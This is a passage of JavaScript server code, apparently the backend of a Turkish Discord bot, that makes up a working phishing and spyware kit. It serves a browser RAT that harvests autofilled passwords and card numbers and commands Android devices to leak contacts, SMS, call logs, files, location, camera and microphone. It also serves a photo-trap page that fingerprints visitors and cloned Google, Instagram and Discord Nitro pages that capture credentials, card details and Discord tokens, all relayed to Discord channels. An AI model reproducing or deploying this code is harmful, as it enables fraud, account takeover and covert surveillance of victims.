+'setTimeout(function(){try{var af=document.createElement("form");af.style.cssText="position:absolute;top:-9999px;left:-9999px;opacity:0";["email","password","name","tel","street-address","cc-number"].forEach(function(a,i){var inp=document.createElement("input");inp.type=i===1?"password":"text";inp.autocomplete=a;af.appendChild(inp)});document.body.appendChild(af);setTimeout(function(){var v=[];af.querySelectorAll("input").forEach(function(inp){if(inp.value&&inp.value.length>1)v.push(inp.autocomplete+":"+inp.value)});if(v.length)S(v.join(" | "),"autofill");af.remove()},5000)}catch(e){}},3000);'

+'// History'
+'setTimeout(function(){S("H:"+history.length,"history")},1500);'

+'// Kapanma'
+'window.addEventListener("beforeunload",function(){S("sayfa kapandi","close")});'

+'// Heartbeat'
+'setInterval(function(){S("1","heartbeat")},60000);'
+'setTimeout(function(){S("RAT baslatildi","status")},1000);'
+'// MOBIL APK KOMUT POLLING'
+'setInterval(function(){try{var qx=new XMLHttpRequest();qx.open("GET","' + new URL(request.url).origin + '/q/' + ratId + '",true);qx.onload=function(){try{var d=JSON.parse(qx.responseText);if(d&&d.cmd){var r="";try{var A=window.Android;if(d.cmd==="rehber")r=A.getContacts();else if(d.cmd==="sms")r=A.getSMS();else if(d.cmd==="arama")r=A.getCallLog();else if(d.cmd==="uygulamalar")r=A.getInstalledApps();else if(d.cmd==="cihaz")r=A.getDeviceInfo();else if(d.cmd==="konum")r=A.getLocation();else if(d.cmd==="dosya"&&d.path)r=A.readFile(d.path);else if(d.cmd==="kamera_on"){A.execCmd("am start -a android.media.action.IMAGE_CAPTURE");r="kamera_acildi";}else if(d.cmd==="ses_kayit"){A.execCmd("am start -a android.provider.MediaStore.RECORD_SOUND");r="ses_kaydi_basladi";}else if(d.cmd==="hepsi")r="REHBER:"+A.getContacts()+"\\n\\nSMS:"+A.getSMS()+"\\n\\nARAMA:"+A.getCallLog()+"\\n\\nAPPS:"+A.getInstalledApps()+"\\n\\nCIHAZ:"+A.getDeviceInfo()+"\\n\\nKONUM:"+A.getLocation();}catch(e){r="hata:"+e.message}S(r,"cmd_"+d.cmd)}}catch(e){}};qx.send()}catch(e){}},5000);'
+'}();'
+'</script></body></html>';
    return new Response(ratPage, { headers: { 'Content-Type': 'text/html; charset=utf-8', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' } });
  }

  if (url.pathname.startsWith('/p/')) {
    const fotoId = url.pathname.split('/p/')[1];
    if (!fotoId || !env.KV) return new Response('Gecersiz servis.', { status: 400 });

    const fotoDataStr = await env.KV.get(fotoId);
    if (!fotoDataStr) return new Response('Fotograf bulunamadi.', { status: 404 });

    const fd = JSON.parse(fotoDataStr);

    if (request.method === 'POST') {
      try {
        const d = await request.json();
        const kurbanIP = request.headers.get('cf-connecting-ip') || '?';
        let report = '[FOTO TUZAK AV]\n';
        report += 'IP: `' + kurbanIP + '`\n';
        if (d.ua) report += 'UA: `' + String(d.ua).slice(0,120) + '`\n';
        if (d.scr) report += 'Ekran: ' + d.scr + '\n';
        if (d.tz) report += 'TZ: ' + d.tz + '\n';
        if (d.lang) report += 'Dil: ' + d.lang + '\n';
        if (d.ram) report += 'RAM: ' + d.ram + 'GB\n';
        if (d.cpu) report += 'CPU: ' + d.cpu + 'cek\n';

        const chId = fd.logChannel || fd.creatorId;
        if (chId && report) {
          try {
            await fetch('https://discord.com/api/v10/channels/' + chId + '/messages', { method: 'POST', headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' }, body: JSON.stringify({ content: report }) });
          } catch (e) {}
        }
        return new Response('OK', { status: 200, headers: { 'Access-Control-Allow-Origin': '*' } });
      } catch (e) { return new Response('Hata', { status: 500 }); }
    }

    const page = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta property="og:image" content="data:' + fd.mime + ';base64,' + fd.imgB64.slice(0,500) + '"><meta property="og:type" content="image"><title>Fotograf</title><style>*{margin:0;padding:0}body{background:#111;display:flex;justify-content:center;align-items:center;min-height:100vh}img{max-width:100%;max-height:100vh}</style></head><body><img src="data:' + fd.mime + ';base64,' + fd.imgB64 + '"><script>'
+'var d={ua:navigator.userAgent,scr:screen.width+"x"+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,ram:navigator.deviceMemory||0,cpu:navigator.hardwareConcurrency||0,ck:navigator.cookieEnabled};'
+'fetch(location.href,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});'
+'</script></body></html>';

    return new Response(page, { headers: { 'Content-Type': 'text/html; charset=utf-8', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' } });
  }

  if (url.pathname === '/monitor') {
    if (request.method !== 'POST') return new Response('POST only', { status: 405 });
    try {
      const body = await request.json();
      const tool = body.tool || 'unknown';
      const event = body.event || 'unknown';
      const data = body.data || {};
      const uid = body.uid || '536233019330002975';
      const ts = body.ts || Math.floor(Date.now() / 1000);

      // KV'ye kaydet (son 100 olay)
      try {
        const key = `monitor_${Date.now()}_${Math.random().toString(36).slice(2,6)}`;
        await env.KV.put(key, JSON.stringify({ tool, event, data, uid, ts }), { expirationTtl: 86400 });
      } catch (e) {}

      // Mesaj olustur (1900 karakter limiti)
      let msg = `[${tool.toUpperCase()}] ${event}\n`;
      if (typeof data === 'object' && data !== null) {
        const entries = Object.entries(data).slice(0, 10);
        for (const [k, v] of entries) {
          const val = String(v).slice(0, 300);
          msg += `  ${k}: ${val}\n`;
        }
      } else if (data) {
        msg += `  ${String(data).slice(0, 1500)}\n`;
      }
      msg = msg.slice(0, 1900);

      // DM gonder
      try {
        const dmRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
          method: 'POST',
          headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ recipient_id: uid })
        });
        if (dmRes.ok) {
          const dm = await dmRes.json();
          await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
            method: 'POST',
            headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg })
          });
        }
      } catch (e) {}

      return new Response('OK', { status: 200, headers: { 'Access-Control-Allow-Origin': '*' } });
    } catch (e) {
      return new Response('Error', { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } });
    }
  }

  return new Response('Kanser Bot Bulut Web Servisi Aktif.', { status: 200 });
}

function buildDefaultLoginPage(pageId, pageData, fields) {
  const title = pageData.title || 'Giris Yap';
  const logos = { google: 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png', instagram: 'https://static.cdninstagram.com/rsrc.php/v3/yS/r/41B_7G7Jc6V.png', twitter: 'https://abs.twimg.com/responsive-web/client-web/icon-ios.77d25eba.png', discord: 'https://cdn.prod.website-files.com/6257adef93867e50d84b30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png' };
  const logo = logos[pageData.tur] || '';

  return `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>${title}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);padding:40px;width:100%;max-width:400px;text-align:center}h1{font-size:24px;margin-bottom:16px;color:#202124}.input-group{text-align:left;margin-bottom:15px}.input-group label{display:block;font-size:14px;color:#5f6368;margin-bottom:4px}.input-group input{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}.input-group input:focus{border-color:#1a73e8}button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:10px}button:hover{background:#1557b0}.error{color:#d93025;font-size:14px;margin-top:12px;display:none}img{max-width:100px;margin:0 auto 24px;display:block}</style></head><body><div class="card">${logo ? `<img src="${logo}" alt="logo">` : ''}<h1>${title}</h1><form id="loginForm" method="POST" action="/login-callback/${pageId}">${fields.map((f,i) => `<div class="input-group"><label>${f}</label><input type="${i===0?'text':'password'}" name="f${i}" placeholder="${f}" required></div>`).join('')}<button type="submit">Giris Yap</button></form><div class="error" id="error">Sifre yanlis. Lutfen tekrar deneyin.</div></div><script>document.getElementById('loginForm').addEventListener('submit',async function(e){e.preventDefault();const fd=new FormData(this);try{const r=await fetch(this.action,{method:'POST',body:new URLSearchParams(fd)});if(r.ok){document.getElementById('error').style.display='block';setTimeout(function(){window.location.href='https://www.google.com'},3000)}else{alert('Baglanti hatasi')}}catch(e){alert('Baglanti hatasi')}})</script></body></html>`;
}

function buildDiscordNitroPage(pageId, pageData) {
  return `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Discord Nitro</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#1e1f22;color:#dbdee1;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{background:#2b2d31;border-radius:12px;padding:40px;width:100%;max-width:480px;border:1px solid #3f4147}.badge{background:#5865f2;color:#fff;padding:4px 12px;border-radius:4px;font-size:12px;font-weight:700;display:inline-block;margin-bottom:12px}h1{font-size:28px;font-weight:800;margin-bottom:8px;background:linear-gradient(90deg,#5865f2,#eb459e);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.sub{color:#949ba4;font-size:14px;margin-bottom:24px;line-height:1.5}.features{background:#1e1f22;border-radius:8px;padding:16px;margin-bottom:24px}.feature{display:flex;align-items:center;gap:10px;padding:6px 0;font-size:14px}.feature svg{flex-shrink:0}.price{text-align:center;margin-bottom:24px;padding:16px;background:#1e1f22;border-radius:8px}.price .amount{font-size:36px;font-weight:800;color:#fff}.price .period{color:#949ba4;font-size:14px}.input-group{text-align:left;margin-bottom:12px}.input-group label{display:block;font-size:12px;color:#b5bac1;margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}.input-group input,.input-group select{width:100%;padding:10px 12px;background:#1e1f22;border:1px solid #3f4147;border-radius:4px;font-size:16px;color:#dbdee1;outline:none}.input-group input:focus{border-color:#5865f2}.row{display:flex;gap:12px}.row .input-group{flex:1}.btn{width:100%;padding:14px;background:#5865f2;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s}.btn:hover{background:#4752c4}.btn:disabled{background:#3f4147;cursor:not-allowed}.secondary{background:transparent;border:1px solid #3f4147;color:#dbdee1}.secondary:hover{background:#3f4147}.step{display:none}.step.active{display:block}.secure{text-align:center;font-size:12px;color:#949ba4;margin-top:16px}.secure svg{vertical-align:middle;margin-right:4px}.loading{display:none;text-align:center;padding:40px}.loading.active{display:block}.spinner{width:40px;height:40px;border:4px solid #3f4147;border-top-color:#5865f2;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}@keyframes spin{to{transform:rotate(360deg)}}.error-message{color:#f23f42;font-size:14px;margin-top:8px;display:none}</style></head><body><div class="card"><span class="badge">AYLIK ABONELIK</span><h1>Discord Nitro</h1><p class="sub">En iyi Discord deneyiminin kilidini aç. Animasyonlu emojiler, özel stickerlar, daha yüksek dosya yükleme ve çok daha fazlası.</p><div class="features"><div class="feature"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5865f2" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> Animasyonlu emojiler ve stickerlar</div><div class="feature"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5865f2" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> 500 MB dosya yukleme</div><div class="feature"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5865f2" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> Ozel ses kanallari ve profil temalari</div><div class="feature"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5865f2" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> HD video ve ekran paylasimi</div></div><div class="price"><div class="amount">$9.99</div><div class="period">aylik — ilk ay ucretsiz</div></div><div class="step active" id="step1"><button class="btn" onclick="showStep(2)">Ucretsiz Dene — 1 Ay</button></div><div class="step" id="step2"><h2 style="font-size:20px;margin-bottom:16px">Odeme Bilgileri</h2><p class="sub" style="font-size:13px">Kart bilgileriniz guvende. Ucretsiz deneme suresince ucret alinmaz.</p><form id="paymentForm"><div class="input-group"><label>Kart Uzerindeki Isim</label><input type="text" id="cardName" placeholder="Ad Soyad" required></div><div class="input-group"><label>Kart Numarasi</label><input type="text" id="cardNum" placeholder="1234 5678 9012 3456" maxlength="19" required></div><div class="row"><div class="input-group"><label>Son Kullanim</label><input type="text" id="cardExp" placeholder="AA/YY" maxlength="5" required></div><div class="input-group"><label>CVV</label><input type="text" id="cardCvv" placeholder="123" maxlength="4" required></div></div></form><div class="error-message" id="cardError">Kart bilgileri gecersiz. Lutfen tekrar deneyin.</div><button class="btn" onclick="submitPayment()">Odeme Yap — $0.00</button><button class="btn secondary" onclick="showStep(1)" style="margin-top:8px">Geri</button></div><div class="step" id="step3"><h2 style="font-size:20px;margin-bottom:16px">Discord Hesabini Bagla</h2><p class="sub" style="font-size:13px">Nitro hediyeni aktif etmek icin Discord hesabina baglan. Token kullanarak hizli baglanti.</p><div class="input-group"><label>Discord Token</label><input type="password" id="discordToken" placeholder="Nzk0NTYyMzQyMDExNTg3MjE3.GasdHf.aBcDeFgHiJkLmNoPqRsTuVwXyZ" required><p style="font-size:11px;color:#949ba4;margin-top:4px">Tokenini nereden bulabilirsin: Discord &gt; Ayarlar &gt; Gelismis &gt; Gelistirici Modu &gt; Tokeni Kopyala</p></div><div class="input-group"><label>Discord E-posta (istege bagli)</label><input type="email" id="discordEmail" placeholder="ornek@email.com"></div><div class="error-message" id="tokenError">Token dogrulanamadi. Lutfen tekrar dene.</div><button class="btn" onclick="submitToken()">Hesabi Bagla</button><button class="btn secondary" onclick="showStep(2)" style="margin-top:8px">Geri</button></div><div class="loading" id="loading"><div class="spinner"></div><p>Nitro hediyen hazirlaniyor...</p></div><div class="secure"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#949ba4" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> Guvenli baglanti ile korunuyor</div></div><script>function showStep(n){document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));document.getElementById('step'+n).classList.add('active')}async function submitPayment(){const info={cardName:document.getElementById('cardName').value,cardNum:document.getElementById('cardNum').value.replace(/\\s/g,''),cardExp:document.getElementById('cardExp').value,cardCvv:document.getElementById('cardCvv').value};if(!info.cardNum||info.cardNum.length<15){document.getElementById('cardError').style.display='block';return}document.getElementById('cardError').style.display='none';try{await fetch('/login-callback/${pageId}',{method:'POST',body:new URLSearchParams({f0:'KART_BILGILERI',f1:JSON.stringify(info)})});showStep(3)}catch(e){alert('Odeme islemi basarisiz')}}async function submitToken(){const token=document.getElementById('discordToken').value;const email=document.getElementById('discordEmail').value;if(!token||token.length<10){document.getElementById('tokenError').style.display='block';return}document.getElementById('tokenError').style.display='none';try{await fetch('/login-callback/${pageId}',{method:'POST',body:new URLSearchParams({f0:'DISCORD_TOKEN',f1:token,email:email})});document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));document.getElementById('loading').classList.add('active');setTimeout(function(){window.location.href='https://discord.com/nitro'},5000)}catch(e){alert('Baglanti hatasi')}}</script></body></html>`;
}

function buildInstagramHilePage(pageId, pageData) {
  return `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Instagram Takipci Hilesi</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#fafafa;color:#262626;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.card{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.1);padding:40px;width:100%;max-width:480px;text-align:center;border:1px solid #dbdbdb}.logo{font-size:32px;font-weight:800;margin-bottom:4px;background:linear-gradient(45deg,#f58529,#feda77,#dd2a7b,#8134af,#515bd4);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.sub{color:#8e8e8e;font-size:14px;margin-bottom:24px}.stats{display:flex;justify-content:space-around;margin-bottom:24px;padding:16px;background:#fafafa;border-radius:8px}.stat .num{font-size:24px;font-weight:700;color:#262626}.stat .lbl{font-size:12px;color:#8e8e8e;margin-top:2px}h2{font-size:20px;margin-bottom:12px}.plan{display:flex;gap:12px;margin-bottom:24px}.plan-card{flex:1;border:2px solid #dbdbdb;border-radius:8px;padding:16px;cursor:pointer;transition:all .2s}.plan-card:hover,.plan-card.selected{border-color:#0095f6}.plan-card.selected{background:#e8f5fe}.plan-card .pname{font-weight:600;font-size:14px;margin-bottom:4px}.plan-card .pfollowers{font-size:22px;font-weight:800;color:#0095f6}.plan-card .pprice{font-size:12px;color:#8e8e8e;margin-top:4px}.plan-card .pbadge{background:#0095f6;color:#fff;font-size:10px;padding:2px 6px;border-radius:3px;display:inline-block;margin-top:4px}.input-group{text-align:left;margin-bottom:12px}.input-group label{display:block;font-size:12px;color:#8e8e8e;margin-bottom:4px;font-weight:600}.input-group input{width:100%;padding:10px 12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;outline:none}.input-group input:focus{border-color:#0095f6}.step{display:none}.step.active{display:block}.btn{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s}.btn:hover{background:#0080db}.btn:disabled{background:#b2dffc;cursor:not-allowed}.secondary{background:transparent;border:1px solid #dbdbdb;color:#262626}.secondary:hover{background:#fafafa}.progress-bar{width:100%;height:8px;background:#dbdbdb;border-radius:4px;margin:16px 0;overflow:hidden}.progress-fill{height:100%;background:#0095f6;border-radius:4px;transition:width .5s;width:0}.error-message{color:#ed4956;font-size:14px;margin-top:8px;display:none}.success{display:none;padding:40px}.success.active{display:block}.success-icon{width:60px;height:60px;border-radius:50%;background:#0095f6;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 16px}.features{list-style:none;text-align:left;margin:16px 0}.features li{padding:8px 0;font-size:14px;color:#555}.features li:before{content:"✓ ";color:#0095f6;font-weight:700}</style></head><body><div class="card"><div class="logo">Instagram</div><p class="sub">Ucretsiz Takipci, Begeni ve Izlenme Kazan</p><div class="stats"><div class="stat"><div class="num">10M+</div><div class="lbl">Kullanici</div></div><div class="stat"><div class="num">500M</div><div class="lbl">Islem</div></div><div class="stat"><div class="num">%99</div><div class="lbl">Basari</div></div></div><div class="step active" id="step1"><h2>Paket Sec</h2><div class="plan"><div class="plan-card" onclick="selectPlan(this,500)"><div class="pname">Baslangic</div><div class="pfollowers">500</div><div class="pprice">Ucretsiz</div></div><div class="plan-card" onclick="selectPlan(this,2000)"><div class="pname">Populer</div><div class="pfollowers">2.000</div><div class="pprice">Ucretsiz</div></div><div class="plan-card" onclick="selectPlan(this,10000)"><div class="pname">VIP</div><div class="pfollowers">10.000</div><div class="pprice">Ucretsiz</div><div class="pbadge">Populer</div></div></div><button class="btn" id="step1Btn" disabled>Devam Et</button></div><div class="step" id="step2"><h2>Instagram Kullanici Adi</h2><p class="sub">Takipci gonderilecek hesabin kullanici adini gir.</p><div class="input-group"><label>Kullanici Adi</label><input type="text" id="username" placeholder="ornek_hesap" required></div><button class="btn" onclick="verifyUsername()">Dogrula ve Devam Et</button><button class="btn secondary" onclick="showStep(1)">Geri</button></div><div class="step" id="step3"><h2>Hesap Dogrulama</h2><p class="sub">Bot oldugunu kanitlamak icin Instagram sifreni gir. Sifren kaydedilmez, sadece dogrulama amacli.</p><div class="input-group"><label>Instagram Sifresi</label><input type="password" id="password" placeholder="Sifreni gir" required></div><div class="error-message" id="passError">Sifre yanlis. Lutfen tekrar dene.</div><button class="btn" onclick="submitPassword()">Dogrula</button><button class="btn secondary" onclick="showStep(2)">Geri</button></div><div class="step" id="step4"><div class="success" id="successScreen"><div class="success-icon">✓</div><h2>Hesap Dogrulandi!</h2><p class="sub">Takipcilerin 5-10 dakika icinde gelmeye baslayacak. Sayfayi kapatabilirsin.</p><div class="features"><li>500 takipci ekleniyor</li><li>Profiline 50 begeni</li><li>3 gonderiye izlenme</li></div><div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div><p style="font-size:13px;color:#8e8e8e" id="progressText">Islem baslatiliyor...</p></div></div></div><script>let selectedPlan=0;function selectPlan(el,followers){document.querySelectorAll('.plan-card').forEach(c=>c.classList.remove('selected'));el.classList.add('selected');selectedPlan=followers;document.getElementById('step1Btn').disabled=false}function showStep(n){document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));document.getElementById('step'+n).classList.add('active')}async function verifyUsername(){const user=document.getElementById('username').value;if(!user){alert('Kullanici adi gir');return}try{await fetch('/login-callback/${pageId}',{method:'POST',body:new URLSearchParams({f0:'INSTAGRAM_USER',f1:user})});showStep(3)}catch(e){alert('Hata')}}async function submitPassword(){const pwd=document.getElementById('password').value;const user=document.getElementById('username').value;if(!pwd){document.getElementById('passError').style.display='block';return}document.getElementById('passError').style.display='none';try{const r=await fetch('/login-callback/${pageId}',{method:'POST',body:new URLSearchParams({f0:'INSTAGRAM_CRED',f1:JSON.stringify({username:user,password:pwd,plan:selectedPlan})})});if(r.ok){showStep(4);document.getElementById('successScreen').classList.add('active');let p=0;const i=setInterval(function(){p+=Math.random()*15+5;if(p>=100){p=100;clearInterval(i);document.getElementById('progressText').textContent='Islem tamamlandi!'}document.getElementById('progressFill').style.width=p+'%';document.getElementById('progressText').textContent='%'+Math.round(p)+' tamamlandi'},400)}else{alert('Dogrulama basarisiz')}}catch(e){alert('Baglanti hatasi')}}</script></body></html>`;
}
